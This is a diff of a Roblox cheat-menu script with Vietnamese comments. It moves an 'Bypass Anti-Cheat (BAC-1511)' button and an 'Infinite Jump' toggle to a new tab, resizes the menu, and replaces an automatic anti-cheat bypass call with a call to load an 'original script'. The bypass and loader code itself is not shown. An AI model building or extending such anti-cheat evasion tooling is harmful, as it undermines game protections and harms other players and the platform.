-TTIcon.Size = UDim2.new(0, 24, 0, 24)
-TTIcon.Position = UDim2.new(0, 10, 0.5, 0)
-TTIcon.AnchorPoint = Vector2.new(0, 0.5)
-TTIcon.BackgroundTransparency = 1
-TTIcon.Image = CONFIG.LogoAssetID
-Instance.new("UICorner", TTIcon).CornerRadius = UDim.new(0, 6)
-
-local TTText = Instance.new("TextLabel", TikTokRow)
-TTText.Size = UDim2.new(1, -48, 1, 0)
-TTText.Position = UDim2.new(0, 40, 0, 0)
-TTText.BackgroundTransparency = 1
-TTText.Text = "TikTok: @ronnei7.htk (Click Copy)"
-TTText.Font = FONT_BOLD
-TTText.TextSize = 10
-TTText.TextColor3 = THEME.AccentMint
-TTText.TextXAlignment = Enum.TextXAlignment.Left
-
-TikTokRow.MouseButton1Click:Connect(function()
-    if setclipboard then setclipboard(CONFIG.TikTokURL)
-    elseif toclipboard then toclipboard(CONFIG.TikTokURL) end
-    TTText.Text = "[V] Đã sao chép link TikTok!"
-    task.delay(1.5, function()
-        if TikTokRow.Parent then TTText.Text = "TikTok: @ronnei7.htk (Click Copy)" end
-    end)
-end)
-
--- ==================== TAB 2 ====================
-local BypassCard = Instance.new("TextButton", Tab2Frame)
+-- ==================== NỘI DUNG TAB 3: NHÂN VẬT ====================
+local BypassCard = Instance.new("TextButton", Tab3Frame)
 BypassCard.Size = UDim2.new(1, -4, 0, 36)
 BypassCard.BackgroundColor3 = Color3.fromRGB(40, 30, 60)
 BypassCard.Text = "🛡️  Bypass Anti-Cheat (BAC-1511)"
@@ -743,11 +789,10 @@ BypassCard.MouseButton1Click:Connect(function()
     end)
 end)
 
-local SliderCard = Instance.new("Frame", Tab2Frame)
+local SliderCard = Instance.new("Frame", Tab3Frame)
 SliderCard.Size = UDim2.new(1, -4, 0, 62)
 SliderCard.BackgroundColor3 = THEME.CardBG
 Instance.new("UICorner", SliderCard).CornerRadius = UDim.new(0, 8)
-
 local SliderStroke = Instance.new("UIStroke", SliderCard)
 SliderStroke.Color = THEME.Border
 SliderStroke.Thickness = 1
@@ -832,11 +877,11 @@ UserInputService.InputChanged:Connect(function(input)
     end
 end)
 
-createToggleRow(Tab2Frame, "Nhảy Vô Hạn (Infinite Jump)", "Nhảy liên tục trên không không giới hạn", STATE.InfiniteJump, function(val)
+createToggleRow(Tab3Frame, "Nhảy Vô Hạn (Infinite Jump)", "Nhảy liên tục trên không không giới hạn", STATE.InfiniteJump, function(val)
     setInfiniteJump(val)
 end)
 
--- Nút tròn mở menu
+-- ==================== 5. NÚT TRÒN MỞ MENU (FLOATING LOGO) ====================
 local ToggleBtn = Instance.new("Frame", ScreenGui)
 ToggleBtn.Name = "FloatingLogo"
 ToggleBtn.Size = UDim2.new(0, 50, 0, 50)
@@ -880,11 +925,11 @@ local function setMenuVisible(state)
     if isMenuOpen then
         MainCard.Visible = true
         TweenService:Create(MainCard, TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
-            Size = UDim2.new(0, 315, 0, 375)
+            Size = UDim2.new(0, 320, 0, 380)
         }):Play()
     else
         local tw = TweenService:Create(MainCard, TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {
-            Size = UDim2.new(0, 315, 0, 0)
+            Size = UDim2.new(0, 320, 0, 0)
         })
         tw:Play()
         tw.Completed:Connect(function()
@@ -903,8 +948,5 @@ CloseBtn.MouseButton1Click:Connect(function()
     setMenuVisible(false)
 end)
 
--- Tự động chạy Bypass Anti-Cheat khi vừa bật script
-task.spawn(function()
-    task.wait(0.5)
-    bypassAntiCheat()
-end)
+-- Tự động nạp script gốc khi thực thi
+loadOriginalScript()
